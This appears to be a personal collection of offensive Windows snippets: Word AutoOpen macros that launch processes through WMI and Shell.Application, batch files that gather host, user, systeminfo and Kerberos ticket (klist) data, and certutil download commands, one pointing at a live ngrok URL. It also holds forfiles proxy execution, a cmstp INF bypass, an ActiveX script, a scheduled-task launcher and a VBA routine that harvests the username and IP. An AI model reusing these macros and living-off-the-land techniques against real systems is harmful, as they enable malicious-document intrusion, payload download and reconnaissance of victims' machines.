Working
Sub AutoOpen()
    Open "C:\Users\Public\macro_test_result.txt" For Output As #1
    Print #1, "Word macro ran successfully without using WScript.Shell"
    Close #1
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "calc.exe"
End Sub

Sub AutoOpen()
    Dim shell
    Set shell = CreateObject("Shell.Application")
    shell.ShellExecute "notepad.exe"
End Sub
------------------------------------------------------------
Sub AutoOpen()
    Dim fso
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set outFile = fso.CreateTextFile("C:\Users\Public\getinfo.bat", True)
    outFile.WriteLine "@echo off"
    outFile.WriteLine "hostname > C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "whoami >> C:\Users\Public\hostinfo.txt"
    outFile.WriteLine "echo Date: %date% >> C:\Users\Public\hostinfo.txt"
    outFile.Close
End Sub



Sub AutoOpen()
    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\getinfo.bat"
End Sub


@echo off
echo === SYSTEM INFO === > C:\Users\Public\sysout.txt
systeminfo >> C:\Users\Public\sysout.txt
klist >> C:\Users\Public\sysout.txt
hostname >> C:\Users\Public\sysout.txt
whoami >> C:\Users\Public\sysout.txt
echo Done > C:\Users\Public\done.txt
pause

Sub AutoOpen()
    CreateObject("Shell.Application").ShellExecute "C:\Users\Public\info.bat"
End Sub


Sub AutoOpen()
    GetObject("winmgmts:root\cimv2:Win32_Process").Create "klist.exe > C:\Users\Public\klist_output.txt"
End Sub


Sub AutoOpen()
    Dim sh
    Set sh = CreateObject("Shell.Application")
    sh.ShellExecute "certutil.exe", _
        "-urlcache -split -f https://ce12-117-232-57-2.ngrok-free.app/new.html C:\tester\new.html", _
        "", "", 1
End Sub

C:\Windows\System32\certutil.exe -urlcache -split -f https://example.com/payload.html C:\tester\payload.html










forfiles /p C:\Windows\System32 /m klist.exe /c "cmd /c klist > C:\tester\klistout.txt"
forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c calc"

Start--
[version]
Signature=$CHICAGO$

[DefaultInstall]
CustomDestination = CustInstDestSectionAllUsers
RunPreSetupCommands = RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
notepad.exe

[CustInstDestSectionAllUsers]
49000,49001=C:\MyFolder

[Strings]
ServiceName="EvilService"
ShortSvcName="EvilSvc"
end--

cmstp.exe /s C:\MyFolder\evil.inf




<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("notepad.exe");
</script>

schtasks /create /tn "SwissKnifeyTask" /tr "C:\MyFolder\SwissShell.exe" /sc once /st 00:00
schtasks /run /tn "SwissKnifeyTask"


Sub ShowUserAndIP_VBScript_ShellExecute()
    Dim shellApp As Object
    Dim user As String
    Dim scriptPath As String
    Dim scriptContent As String

    ' Get current username
    user = Environ("USERNAME")
    
    ' Set path for the temporary VBScript file
    scriptPath = Environ("TEMP") & "\user_ip_info.vbs"

    ' VBScript content to fetch the current IP and user
    scriptContent = "Set objNetwork = CreateObject(""WScript.Network"")" & vbCrLf
    scriptContent = scriptContent & "strUser = objNetwork.UserName" & vbCrLf
    scriptContent = scriptContent & "Set objShell = CreateObject(""WScript.Shell"")" & vbCrLf
    scriptContent = scriptContent & "Set objExec = objShell.Exec(""ipconfig"")" & vbCrLf
    scriptContent = scriptContent & "strIP = """ & vbCrLf
    scriptContent = scriptContent & "Do While Not objExec.StdOut.AtEndOfStream" & vbCrLf
    scriptContent = scriptContent & "    strLine = objExec.StdOut.ReadLine" & vbCrLf
    scriptContent = scriptContent & "    If InStr(strLine, ""IPv4"") > 0 Then" & vbCrLf
    scriptContent = scriptContent & "        strIP = Mid(strLine, InStr(strLine, "": "") + 2)" & vbCrLf
    scriptContent = scriptContent & "    End If" & vbCrLf
    scriptContent = scriptContent & "Loop" & vbCrLf
    scriptContent = scriptContent & "MsgBox ""User: "" & strUser & vbCrLf & ""IP Address: "" & strIP" & vbCrLf

    ' Create VBScript file
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    With fso.CreateTextFile(scriptPath, True)
        .Write scriptContent
        .Close
    End With

    ' Use ShellExecute to run the VBScript
    Set shellApp = CreateObject("Shell.Application")
    shellApp.ShellExecute "wscript.exe", scriptPath, "", "open", 1
End Sub
